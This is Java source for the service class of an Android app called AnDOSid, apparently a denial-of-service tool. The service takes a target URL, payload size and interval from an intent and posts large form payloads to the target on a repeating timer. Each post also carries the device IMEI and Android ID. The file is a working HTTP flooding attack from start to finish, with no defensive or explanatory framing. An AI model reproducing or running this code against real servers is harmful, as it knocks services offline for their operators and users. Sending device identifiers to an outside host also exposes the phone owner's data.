package com.scott.herbert.AnDOSid;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.os.SystemClock;
import android.util.Log;

public class DOService extends Service{

	private static final int ANDOSID_ID = 21441109;
	DOSdata localDOSdata = new DOSdata();
	private Timer startTask;
	// ArrayList<AsyncDOS> AsyncList = new ArrayList<AsyncDOS>();
	private static String KEY = "DOSService";
	
	
	
	@Override
	public IBinder onBind(Intent arg0) {
		// TODO Auto-generated method stub
		return null;
	}
	
	@Override
	public void onCreate() {
		// load localDOS
		
		
	}

	@Override
	public void onDestroy() {
		startTask.cancel();
	}
	
	@Override
	public void onStart(Intent intent, int startid) {
		Log.d(KEY,"in onStart");
		// load information from the intent
		localDOSdata.setAndroidId(intent.getStringExtra("DandroidId"));
		localDOSdata.setIMEI(intent.getStringExtra("DIMEI"));
		localDOSdata.setTarget(intent.getStringExtra("DTarget"));
		localDOSdata.setPayload(Integer.parseInt(intent.getStringExtra("DPayloadSize")));
		localDOSdata.setMilliseconds(Integer.parseInt(intent.getStringExtra("DMilliseconds")));

		Log.d(KEY,"got localDOSdata");
		
		// set the notification control
		
		String ns = Context.NOTIFICATION_SERVICE;
		NotificationManager mNotificationManager = (NotificationManager) getSystemService(ns);
		int icon = R.drawable.icon;
		CharSequence tickerText = getResources().getText(R.string.app_name) + " - " + getResources().getText(R.string.AnDOSid_started);
		long when = System.currentTimeMillis();
		Notification notification = new Notification(icon, tickerText, when);
		Context context = getApplicationContext();
		CharSequence contentTitle = getResources().getText(R.string.app_name);
		CharSequence contentText = getResources().getText(R.string.AnDOSid_started);
		Intent notificationIntent = new Intent(this, AnDOSid.class);
		notificationIntent.putExtra("AR", 1);
		PendingIntent contentIntent = PendingIntent.getActivity(this, 0, notificationIntent, 0);

		notification.setLatestEventInfo(context, contentTitle, contentText, contentIntent);
		mNotificationManager.notify(ANDOSID_ID, notification);
		
		Log.d(KEY,"set note");
		
		// add a new timer (set to fire... one a second?)
		startTask = new Timer("AnDOSTimer");
		Log.d(KEY,"new Timer");
		startTask.scheduleAtFixedRate(doRefresh, 0, localDOSdata.getMilliseconds());
		Log.d(KEY,"set timer");
		//doInBackground();
		// profit.
		
	}

	
	protected void doInBackground() {
		   
		
		long startTime;
		long endTime;
		long timeTaken;
		
		Log.d(KEY, "in doinBackground");
		
        HttpClient httpclient = new DefaultHttpClient();
        Log.d(KEY, "set httpclient");
        Log.d(KEY,"Target =  ]"+localDOSdata.getTarget()+"[");

        HttpPost httppost = new HttpPost(localDOSdata.getTarget());

        Log.d(KEY, "set httppost");
        httppost.setHeader("User-Agent", localDOSdata.getHttpUserAgent());
        Log.d(KEY, "set UserAgent");
        try {
            // Add your data
            List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(3);
            nameValuePairs.add(new BasicNameValuePair("IMEI", localDOSdata.getIMEI()));
            nameValuePairs.add(new BasicNameValuePair("AndroidId", localDOSdata.getAndroidId()));
            nameValuePairs.add(new BasicNameValuePair("payload", localDOSdata.getPayload()));
            httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
            Log.d(KEY,"setdata");
             startTime = SystemClock.elapsedRealtime();
             httpclient.execute(httppost);
             endTime = SystemClock.elapsedRealtime();
             
             
             
             Log.d(KEY,"posted");
        } catch (ClientProtocolException e) {
            // TODO Auto-generated catch block
        	Log.d(KEY, "ClientProtocolException "+e.getMessage());
        } catch (IOException e) {
            // TODO Auto-generated catch block
        	Log.d(KEY, "IOException "+e.getMessage());
        }
    }
	
	public void addNewDoS(){
		doInBackground();
	}
	
	public TimerTask doRefresh = new TimerTask(){
		public void run() {
			Log.d(KEY,"in doRefresh");
			addNewDoS();
		}
	};
	
}
